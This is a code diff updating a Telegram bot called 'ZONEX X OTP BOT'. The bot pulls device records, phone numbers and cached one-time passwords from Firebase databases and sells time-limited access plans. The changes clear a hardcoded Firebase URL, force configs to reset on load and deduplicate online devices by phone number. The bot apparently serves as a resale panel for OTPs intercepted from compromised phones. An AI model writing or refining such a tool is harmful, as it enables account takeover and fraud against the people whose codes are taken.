@@ -2,8 +2,8 @@
 #!/usr/bin/env python3
 """
 ╔══════════════════════════════════════════╗
-║   ZONEX X OTP BOT (FILTERED v1.3)        ║
-║   FIXED: Duplicate buttons completely    ║
+║   ZONEX X OTP BOT (FILTERED v1.5)        ║
+║   FIXED: 100% No Duplicate Numbers       ║
 ╚══════════════════════════════════════════╝
 """
 
@@ -79,10 +79,7 @@ def _gen_key_raw(length=10) -> str:
 def _default_data() -> dict:
     return {
         "users": {},
-        "firebase_configs": [
-            {"url": "https://paisa-8e4f4-default-rtdb.firebaseio.com",
-             "label": "Main DB", "key": ""}
-        ],
+        "firebase_configs": [], # ★ KHALI DEFAULT
         "pricing_plans": [
             {"id": "p1", "hours": 24,  "price": 30,  "label": "1 Din (24h)"},
             {"id": "p2", "hours": 168, "price": 100, "label": "7 Din (168h)"},
@@ -122,6 +119,8 @@ def load_data() -> dict:
             d.setdefault("qr_file_id", "")
             d.setdefault("pending_payments", {})
             d.setdefault("maintenance", False)
+            # ★ Force clear old configs on load to avoid mix-ups
+            d["firebase_configs"] = []
             return d
     except Exception as e:
         logger.error(f"load_data: {e}")
@@ -171,6 +170,7 @@ async def _load_firestore() -> bool:
                 d.setdefault("qr_file_id",       "")
                 d.setdefault("pending_payments", {})
                 d.setdefault("maintenance",      False)
+                
                 global data
                 data = d
                 os.makedirs(os.path.dirname(DATA_FILE), exist_ok=True)
@@ -499,7 +499,6 @@ async def refresh_all():
                 fb_conn_status[cfg["label"]] = "error"
         await asyncio.gather(*[_safe(cfg) for cfg in data["firebase_configs"]])
         last_refresh = now_dt().strftime("%H:%M:%S")
-        logger.info(f"✅ Refresh done | Online: {count_online()} | OTPs: {count_otps()}")
 
 # ─── Counters ────────────────────────────────────────────────────────────────
 def count_online() -> int:
@@ -518,21 +517,24 @@ def count_otps() -> int:
     return sum(len(ol) for om in otp_cache.values() for ol in om.values())
 
 def all_online() -> list:
-    # ★ PERFECT DEDUPLICATE BY PHONE
     best = {}
     for lb, dm in device_cache.items():
         for did, info in dm.items():
             if not info.get("online"): continue
             ph = info.get("phone", "—")
             if ph == "—": continue
+            
+            # Deduplicate strictly by phone number
             otps = otp_cache.get(lb, {}).get(did, [])
             latest_dt = otps[0].get("_dt") if otps else None
+            
             if ph not in best:
                 best[ph] = (lb, did, info, latest_dt)
             else:
                 ex_dt = best[ph][3]
                 if latest_dt and (ex_dt is None or latest_dt > ex_dt):
                     best[ph] = (lb, did, info, latest_dt)
+                    
     return [(lb, did, info) for (lb, did, info, _) in best.values()]
 
 def resolve_label(esc: str) -> str:
@@ -1257,7 +1259,6 @@ async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         await asyncio.gather(*[_safe_clients(cfg) for cfg in data["firebase_configs"]])
         last_refresh = now_dt().strftime("%H:%M:%S")
 
-        # ★★★ YAHAN DEDUPLICATE HO RAHA HAI ★★★
         devs = all_online()
         total_online_all = len(devs)
         total_devices_all = count_total()
@@ -2448,7 +2449,7 @@ async def _on_startup(app):
 def main():
     if not BOT_TOKEN:
         logger.error("❌ BOT_TOKEN not set!"); return
-    logger.info("🚀 ZONEX X OTP Bot (Filtered v1.3) starting...")
+    logger.info("🚀 ZONEX X OTP Bot (Filtered v1.5) starting...")
     logger.info(f"👑 Admins: {ADMIN_IDS}")
     logger.info(f"📢 Channels: {CHANNELS}")
     logger.info(f"🔥 Firebase Project: {FS_PROJECT}")
